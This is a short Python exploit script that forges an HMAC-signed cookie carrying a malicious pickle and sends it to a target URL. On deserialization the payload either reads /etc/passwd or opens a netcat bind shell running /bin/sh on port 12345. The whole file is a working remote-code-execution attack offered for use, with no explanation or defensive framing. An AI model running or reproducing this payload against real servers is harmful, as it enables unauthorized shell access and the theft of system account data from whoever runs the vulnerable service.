import pickle, subprocess, base64, hmac, requests, sys

class getpasswd(object):
    def __reduce__(self):
        return (subprocess.check_output, (('cat','/etc/passwd'),))


class nc(object):
    def __reduce__(self):
        return (subprocess.check_output, (('nc', '-lvp', '12345', '-e', '/bin/sh'),))


if len(sys.argv) != 3:
    print("Usage: %s TARGET SECRET_KEY" % sys.argv[0])

TARGET = sys.argv[1]
SECRET_KEY = sys.argv[2]

# if you want to passwd file
# change nc() to getpasswd()

#p = pickle.dumps(('account', getpasswd()))
p = pickle.dumps(('account', nc()))
msg = base64.b64encode(p)
sig = base64.b64encode(hmac.new(SECRET_KEY, msg).digest())
c = '!'+sig+'?'+msg
print c
print requests.get(TARGET, cookies=dict(account=c)).text

